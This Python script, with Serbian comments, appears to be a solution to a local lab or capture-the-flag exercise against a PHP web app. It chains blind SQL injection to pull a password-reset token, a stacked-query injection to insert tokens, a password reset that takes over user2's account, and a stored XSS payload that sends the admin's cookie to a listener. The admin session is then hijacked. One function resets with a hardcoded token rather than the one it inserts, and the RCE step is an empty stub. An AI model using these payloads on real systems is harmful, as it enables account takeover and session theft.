import requests
import socket
import base64
import threading
import time
import random
import string
from playwright.sync_api import sync_playwright
import requests
import string

BASE_URL = "http://127.0.0.1:8000"
CHARS = string.ascii_letters + string.digits

def check_char(position, char):
    """Proverava da li je karakter na poziciji == char"""
    payload = {
        "username": f"' AND SUBSTRING((SELECT token FROM tokens WHERE uid=2), {position}, 1) = '{char}'; --"
    }
    r = requests.post(f"{BASE_URL}/forgotusername.php", data=payload)
    return "User exists" in r.text  # True = pogodili smo karakter

def extract_token(uid=2):
    """Izvlači token karakter po karakter"""
    token = ""
    position = 1
    
    while True:
        found = False
        for char in CHARS:
            if check_char(position, char):
                token += char
                print(f"[*] Token do sada: {token}")
                position += 1
                found = True
                break
        
        if not found:
            break  # Nema više karaktera
    
    return token

def login_bypass_blind():
    print("[*] Izvlačim token iz baze (Blind SQLi)...")
    token = extract_token(uid=2)
    print(f"[+] Token pronađen: {token}")
    
    # Sada koristimo pravi token!
    s = requests.Session()
    reset_payload = {
        "token": token,
        "password1": "hacked123",
        "password2": "hacked123"
    }
    s.post(f"{BASE_URL}/resetpassword.php", data=reset_payload)
    print("[+] Lozinka resetovana!")
    
    s.post(
        f"{BASE_URL}/login.php",
        data={"username": "user2", "password": "hacked123"},
        allow_redirects=False,
    )
    print("[+] LOGIN BYPASS USPEŠAN!")
    return s
def login_bypass():
    print("LOGIN BYPASS - SQL Injection")
    
    s = requests.Session()
    
    # Korak 1: SQLi - ubacujemo token za user2 (uid=3)
    token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    
    print("[*] Ubacujem token za user2 kroz SQL Injection...")
    sqli_payload = {
        "username": f"' ; INSERT INTO tokens (uid, token) VALUES (3, '{token}'); --"
    }
    # sqli_payload = {
    #     "username": "' ; INSERT INTO tokens (uid, token) VALUES (3, 'exploit_token_123'); --"
    # }
    s.post("http://127.0.0.1:8000/forgotusername.php", data=sqli_payload)
    print("[+] Token ubacen u bazu!")

    # Korak 2: Koristimo token da resetujemo lozinku user2
    print("[*] Resetujem lozinku user2...")
    reset_payload = {
        "token": "exploit_token_123",
        "password1": "hacked123",
        "password2": "hacked123"
    }
    s.post("http://127.0.0.1:8000/resetpassword.php", data=reset_payload)
    print("[+] Lozinka resetovana!")

    # Korak 3: Login kao user2 sa novom lozinkom
    print("[*] Logujem se kao user2...")
    login_payload = {
        "username": "user2",
        "password": "hacked123"
    }
    s.post(
        "http://127.0.0.1:8000/login.php",
        data=login_payload,
        allow_redirects=False,
    )
    print("[+] LOGIN BYPASS USPEŠAN - ulogovani kao user2!")
    return s

#Zapravo moramo simulirati browser, nije dovoljno samo poslati login request kao admin
#pip install playwright
#playwright install chromium
#Morate ovo raditi zao mi je :(
def _admin_login():
    time.sleep(2)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        page.goto("http://127.0.0.1:8000/login.php")
        page.fill('input[name="username"]', "admin")
        page.fill('input[name="password"]', "admin")
        page.click('input[value="Log In"]')

        page.wait_for_timeout(2000)

        browser.close()
        print("Admin visited the page")


def privilege_escalation(session):
    print("PRIVILEGE ESCALATION")
    payload = "<img src='-1' onerror=\"fetch('http://127.0.0.1:8001/'+btoa(document.cookie))\"/>"

    session.post(f"http://127.0.0.1:8000/profile.php", data={"description": payload})
    print("XSS planted, waiting for admin to log in")

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 8001))
    srv.listen()
    print("Started server")

    admin_thread = threading.Thread(target=_admin_login)
    admin_thread.start()

    #Cek da se admin uloguje
    sock_c, _ = srv.accept()
    request = sock_c.recv(4096)
    #dekoduj kolacic
    cookie = base64.b64decode(request.split(b" ")[1][1:]).decode()
    sock_c.close()
    srv.close()

    admin_session = requests.Session()
    name, value = cookie.split("=", 1)
    admin_session.cookies.set(name.strip(), value.strip())
    print(f"admin cookie: {cookie}")
    return admin_session

def rce(admin_session):
    return

if __name__ == "__main__":
    session = login_bypass_blind()
    
    # Proveri da li si ulogovana
    r = session.get("http://127.0.0.1:8000/index.php")
    
    if "user2" in r.text:
        print("[✅] Potvrda: Session radi, ulogovani kao user2!")
    else:
        print("[❌] Session ne radi!")
    
    # Ili ispiši kolačiće
    print("Kolačići:", session.cookies.get_dict())
    
    admin_session = privilege_escalation(session)
    rce(admin_session)